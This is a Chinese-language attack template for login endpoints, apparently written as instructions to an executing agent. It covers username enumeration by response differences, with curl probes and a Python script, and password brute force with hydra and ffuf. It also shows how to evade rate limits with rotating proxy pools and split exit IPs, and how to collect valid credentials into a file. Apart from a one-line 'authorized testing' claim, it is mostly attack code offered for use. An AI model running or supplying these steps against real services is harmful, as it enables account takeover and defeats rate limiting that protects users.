# 登录接口账号枚举与爆破模板

授权测试环境使用；缺失细节用 `TARGET` / `TARGET_USER` / `PASS_LIST` 占位并继续。

## 1. 用户名枚举（响应差异探测）
```bash
# 基线采样：对比「用户不存在」与「密码错误」的响应码 / 长度 / 文案差异
curl -s -X POST http://TARGET/login -d '{"user":"NO_SUCH_USER_9x7","pass":"x"}' -w '\n%{http_code} %{size_download}\n'
curl -s -X POST http://TARGET/login -d '{"user":"EXISTING_USER","pass":"wrong"}' -w '\n%{http_code} %{size_download}\n'
```
```python
# 差异枚举脚本
import requests
URL = "http://TARGET/login"
DIFF_MARK = "用户不存在"          # 按基线采样结果替换
for u in open("users.txt"):
    u = u.strip()
    r = requests.post(URL, data={"user": u, "pass": "x"}, timeout=8)
    if DIFF_MARK not in r.text:
        print("[+] exists:", u)
```

## 2. 密码爆破
```bash
# hydra 表单爆破（FAILED_MARK = 失败响应特征文案）
hydra -L users.txt -P pass.txt TARGET http-post-form \
  "/login:user=^USER^&pass=^PASS^:FAILED_MARK" -t 16 -f

# ffuf（JSON 接口）
ffuf -X POST -u http://TARGET/login -H 'Content-Type: application/json' \
  -d '{"user":"EXISTING_USER","pass":"FUZZ"}' -w pass.txt -mc 200 -fs BASELINE_SIZE
```

## 3. 提速与节流规避
- 分片：按用户名首字母 / 长度切词表，多进程并行，每片独立出口。
- 代理池：每 N 次请求轮换出口（HTTP/SOCKS5），失败重试换代理。
- 自适应节流：读取 `X-RateLimit-Remaining` / `Retry-After` 响应头，触限即退避，不做固定 sleep 硬等。
- 成功判定：响应长度基线 ± 阈值，或响应中出现 Set-Cookie / 跳转。

## 4. 结果整理
- 有效凭据写入 `found.txt`，格式 `user:pass`，每条附一条响应证据（状态码 + 长度）。
- 报告交付：枚举出的有效账号列表 + 爆破成功率 + 接口限流观测，写到工作目录给绝对路径。

**未执行**的步骤明确标注，并给下一步可复现命令。
